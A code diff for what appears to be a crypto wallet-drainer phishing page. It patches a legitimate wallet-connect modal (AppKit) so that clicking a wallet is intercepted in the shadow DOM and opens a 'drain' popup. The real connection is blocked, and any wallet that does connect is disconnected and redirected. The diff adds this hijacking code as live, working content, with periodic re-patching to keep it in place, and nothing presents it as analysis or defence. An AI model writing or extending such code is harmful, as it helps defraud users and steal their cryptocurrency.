@@ -99,19 +99,45 @@ function openDrainPopup(walletName) {
 // Track last selected wallet name
 let lastClickedWallet = '';
 
-// Method 1: AppKit subscribe events — only SELECT_WALLET (actual wallet selection)
-modal.subscribeEvents((event) => {
-  const e = event?.data?.event;
-  if (e === 'SELECT_WALLET') {
-    const name = event?.data?.properties?.name || event?.data?.properties?.wallet || '';
-    if (name) {
+// Helper: walk shadow DOM to find all elements matching a selector
+function deepQueryAll(root, selector) {
+  const results = [];
+  const walk = (node) => {
+    if (node.shadowRoot) {
+      results.push(...node.shadowRoot.querySelectorAll(selector));
+      node.shadowRoot.querySelectorAll('*').forEach(walk);
+    }
+    node.querySelectorAll('*').forEach((child) => {
+      if (child.shadowRoot) walk(child);
+    });
+  };
+  walk(root);
+  return results;
+}
+
+// Patch wallet items inside Shadow DOM — block clicks from reaching AppKit
+function patchWalletItems() {
+  const items = deepQueryAll(document, 'wui-list-wallet');
+  items.forEach((el) => {
+    if (el._landingPatched) return;
+    el._landingPatched = true;
+    el.addEventListener('click', (e) => {
+      e.stopImmediatePropagation();
+      e.preventDefault();
+      const name = el.getAttribute('name') || el.textContent?.trim()?.split('\n')?.[0]?.trim() || '';
       lastClickedWallet = name;
       openDrainPopup(name);
-    }
-  }
-});
+    }, true);
+  });
+}
 
-// Method 2: If wallet somehow connects, redirect
+// Watch for AppKit modal to appear and patch wallet items
+const domObserver = new MutationObserver(() => patchWalletItems());
+domObserver.observe(document.body, { childList: true, subtree: true });
+// Also re-patch periodically in case new wallet items load (e.g. All Wallets view)
+setInterval(patchWalletItems, 500);
+
+// Backup: If wallet somehow connects to landing, disconnect and redirect
 modal.subscribeProviders((state) => {
   if (state['solana']) {
     try { modal.disconnect(); } catch (e) {}
